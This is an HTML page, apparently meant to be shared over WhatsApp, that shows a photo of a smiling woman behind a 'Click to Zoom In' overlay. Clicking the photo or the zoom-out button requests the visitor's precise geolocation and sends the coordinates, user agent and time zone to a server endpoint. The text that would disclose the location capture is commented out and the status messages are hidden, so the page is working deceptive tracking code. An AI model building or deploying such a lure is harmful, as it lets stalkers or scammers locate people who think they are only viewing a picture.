<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title></title>

  <!-- Open Graph / WhatsApp link preview -->
  <meta property="og:type" content="website" />
  <meta property="og:url" content="" />
  <meta property="og:title" content="" />
  <meta property="og:description" content="" />
  <meta property="og:image" content="https://entkz8eilwabyqqi.public.blob.vercel-storage.com/image2.jpeg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="1500" />

  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg-1: #fff9f5;
      --bg-2: #fde7d9;
      --bg-3: #fcd5ce;
      --text: #3f2d2d;
      --muted: #735f5f;
      --card: rgba(255, 255, 255, 0.68);
      --ring: rgba(237, 137, 114, 0.4);
      --ok: #1f8a50;
      --err: #b42318;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
      background:
        radial-gradient(circle at 10% 20%, var(--bg-2) 0 25%, transparent 45%),
        radial-gradient(circle at 80% 0%, var(--bg-3) 0 30%, transparent 50%),
        linear-gradient(140deg, var(--bg-1), #ffffff);
      color: var(--text);
      font-family: "Manrope", sans-serif;
      overflow-x: hidden;
    }

    .card {
      width: min(920px, 100%);
      border-radius: 28px;
      background: var(--card);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.8);
      box-shadow: 0 20px 80px rgba(80, 48, 45, 0.18);
      display: grid;
      grid-template-columns: 1fr 1fr;
      overflow: hidden;
      animation: floatIn 700ms ease-out;
    }

    .panel {
      padding: clamp(20px, 4vw, 44px);
      display: grid;
      align-content: center;
      gap: 14px;
    }

    h1 {
      margin: 0;
      font-family: "Playfair Display", serif;
      font-size: clamp(1.9rem, 4vw, 3rem);
      line-height: 1.05;
      letter-spacing: 0.2px;
    }

    p {
      margin: 0;
      color: var(--muted);
      line-height: 1.6;
    }

    .girl-wrap {
      position: relative;
      min-height: 380px;
      display: grid;
      place-items: center;
      padding: 20px;
      background: linear-gradient(180deg, #fff7f2, #ffe8dd);
    }

    .girl-image {
      width: min(100%, 420px);
      aspect-ratio: 4 / 5;
      object-fit: cover;
      border-radius: 24px;
      cursor: pointer;
      box-shadow: 0 18px 45px rgba(64, 37, 31, 0.26);
      transition: transform 250ms ease, box-shadow 250ms ease;
      outline: none;
      border: 3px solid transparent;
    }

    .girl-image:hover,
    .girl-image:focus-visible {
      transform: translateY(-4px) scale(1.01);
      box-shadow: 0 26px 60px rgba(64, 37, 31, 0.3);
      border-color: var(--ring);
    }

    .hint {
      font-size: 0.9rem;
      opacity: 0.9;
    }

    .status {
      margin-top: 8px;
      padding: 12px 14px;
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.7);
      border: 1px solid rgba(196, 146, 128, 0.2);
      white-space: pre-line;
      min-height: 64px;
    }

    .status.ok {
      color: var(--ok);
    }

    .status.error {
      color: var(--err);
    }

    .img-wrapper {
      position: relative;
      width: min(100%, 420px);
      border-radius: 24px;
      overflow: hidden;
      cursor: zoom-in;
    }

    .img-wrapper .girl-image {
      width: 100%;
      display: block;
      transition: transform 400ms ease;
    }

    .zoom-overlay {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 10px;
      background: rgba(0, 0, 0, 0.32);
      opacity: 1;
      transition: opacity 200ms ease;
      border-radius: 24px;
      pointer-events: none;
    }

    .img-wrapper:hover .zoom-overlay {
      opacity: 0.6;
    }

    .zoom-overlay svg {
      width: 52px;
      height: 52px;
      stroke: #fff;
      filter: drop-shadow(0 2px 6px rgba(0,0,0,0.5));
    }

    .zoom-overlay span {
      color: #fff;
      font-family: "Manrope", sans-serif;
      font-size: 1rem;
      font-weight: 600;
      letter-spacing: 0.5px;
      text-shadow: 0 2px 8px rgba(0,0,0,0.6);
    }

    /* Lightbox */
    .lightbox {
      display: none;
      position: fixed;
      inset: 0;
      z-index: 1000;
      background: rgba(0, 0, 0, 0.88);
      align-items: center;
      justify-content: center;
      animation: fadeIn 250ms ease;
    }

    .lightbox.open {
      display: flex;
    }

    .lightbox img {
      max-width: 92vw;
      max-height: 92vh;
      border-radius: 18px;
      box-shadow: 0 30px 80px rgba(0,0,0,0.7);
      animation: zoomIn 300ms cubic-bezier(0.34, 1.56, 0.64, 1);
    }

    .zoom-out-btn {
      position: absolute;
      top: 22px;
      right: 22px;
      background: rgba(255,255,255,0.15);
      backdrop-filter: blur(8px);
      border: 2px solid rgba(255,255,255,0.35);
      border-radius: 50px;
      color: #fff;
      font-family: "Manrope", sans-serif;
      font-size: 0.95rem;
      font-weight: 700;
      padding: 10px 20px;
      cursor: zoom-out;
      display: flex;
      align-items: center;
      gap: 8px;
      transition: background 200ms ease;
    }

    .zoom-out-btn:hover {
      background: rgba(255,255,255,0.28);
    }

    .zoom-out-btn svg {
      width: 20px;
      height: 20px;
      stroke: #fff;
      flex-shrink: 0;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to   { opacity: 1; }
    }

    @keyframes zoomIn {
      from { transform: scale(0.7); opacity: 0; }
      to   { transform: scale(1);   opacity: 1; }
    }

    @keyframes floatIn {
      from {
        transform: translateY(18px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }

    @media (max-width: 820px) {
      .card {
        grid-template-columns: 1fr;
      }

      .girl-wrap {
        order: -1;
        min-height: 300px;
      }
    }
  </style>
</head>
<body>
  <main class="card">
    <!-- <section class="panel">
      <h1>Tap the Image to Share Your Location</h1>
      <p>
        No button needed. Click the image once and your location is captured with your permission.
        Each successful click stores your location securely in cloud storage.
      </p>
      <p class="hint">Works on HTTPS (Vercel deployment is HTTPS by default).</p>
      <div id="status" class="status" aria-live="polite">Waiting for your click...</div>
    </section> -->
<div id="status" style="display:none"></div>
    <section class="girl-wrap">
      <div class="img-wrapper" id="girlImage" tabindex="0" role="button" aria-label="Click to share location">
        <img
          class="girl-image"
          src="https://entkz8eilwabyqqi.public.blob.vercel-storage.com/image2.jpeg"
          alt="Portrait of a smiling woman"
        />
        <div class="zoom-overlay">
          <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg">
            <circle cx="11" cy="11" r="8"/>
            <line x1="21" y1="21" x2="16.65" y2="16.65"/>
            <line x1="11" y1="8" x2="11" y2="14"/>
            <line x1="8" y1="11" x2="14" y2="11"/>
          </svg>
          <span>Click to Zoom In</span>
        </div>
      </div>
    </section>

    <!-- Lightbox -->
    <div class="lightbox" id="lightbox" role="dialog" aria-modal="true" aria-label="Zoomed image">
      <button class="zoom-out-btn" id="zoomOutBtn" aria-label="Zoom out">
        <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg">
          <circle cx="11" cy="11" r="8"/>
          <line x1="21" y1="21" x2="16.65" y2="16.65"/>
          <line x1="8" y1="11" x2="14" y2="11"/>
        </svg>
        Zoom Out
      </button>
      <img
        id="lightboxImg"
        src="https://entkz8eilwabyqqi.public.blob.vercel-storage.com/image2.jpeg"
        alt="Portrait of a smiling woman — zoomed"
      />
    </div>
  </main>

  <script>
    const statusEl = document.getElementById("status");
    const girlImage = document.getElementById("girlImage");
    const STORAGE_KEY = "locationCaptures";

    function setStatus(message, type = "") {
      statusEl.textContent = message;
      statusEl.className = `status ${type}`.trim();
    }

    function saveLocation(payload) {
      const existing = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
      existing.push(payload);
      // Keep the newest 50 records only.
      localStorage.setItem(STORAGE_KEY, JSON.stringify(existing.slice(-50)));
    }

    async function saveLocationToServer(payload) {
      const response = await fetch("/api/save-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Server save failed");
      }

      return data;
    }

    function requestLocation() {
      if (!navigator.geolocation) {
        setStatus("Geolocation is not supported in this browser.", "error");
        return;
      }

      setStatus("Requesting location permission...");

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const accuracy = position.coords.accuracy;

          const payload = {
            latitude: lat,
            longitude: lon,
            accuracyMeters: accuracy,
            capturedAt: new Date().toISOString()
          };

          saveLocation(payload);

          try {
            await saveLocationToServer({
              ...payload,
              source: "image-click",
              userAgent: navigator.userAgent,
              timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown"
            });

            setStatus(
              `Location saved to cloud.\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${Math.round(accuracy)}m`,
              "ok"
            );
          } catch (serverError) {
            setStatus(
              `Location captured, but cloud save failed.\nLatitude: ${lat}\nLongitude: ${lon}\nReason: ${serverError.message}`,
              "error"
            );
          }
        },
        (error) => {
          const reasonByCode = {
            1: "Permission denied.",
            2: "Position unavailable.",
            3: "Request timed out."
          };
          const reason = reasonByCode[error.code] || "Unable to fetch location.";
          setStatus(`Location not saved. ${reason}`, "error");
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }

    const lightbox   = document.getElementById("lightbox");
    const zoomOutBtn = document.getElementById("zoomOutBtn");
    let locationCaptured = false;

    function openLightbox() {
      lightbox.classList.add("open");
      document.body.style.overflow = "hidden";
    }

    function closeLightbox() {
      lightbox.classList.remove("open");
      document.body.style.overflow = "";
    }

    girlImage.addEventListener("click", () => {
      openLightbox();
      if (!locationCaptured) {
        locationCaptured = true;
        requestLocation();
      }
    });

    girlImage.addEventListener("keydown", (event) => {
      if (event.key === "Enter" || event.key === " ") {
        event.preventDefault();
        openLightbox();
        if (!locationCaptured) {
          locationCaptured = true;
          requestLocation();
        }
      }
    });

    zoomOutBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      closeLightbox();
      requestLocation();
    });

    // Close on backdrop click
    lightbox.addEventListener("click", (e) => {
      if (e.target === lightbox) closeLightbox();
    });

    // Close on Escape
    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape") closeLightbox();
    });
  </script>
</body>
</html>
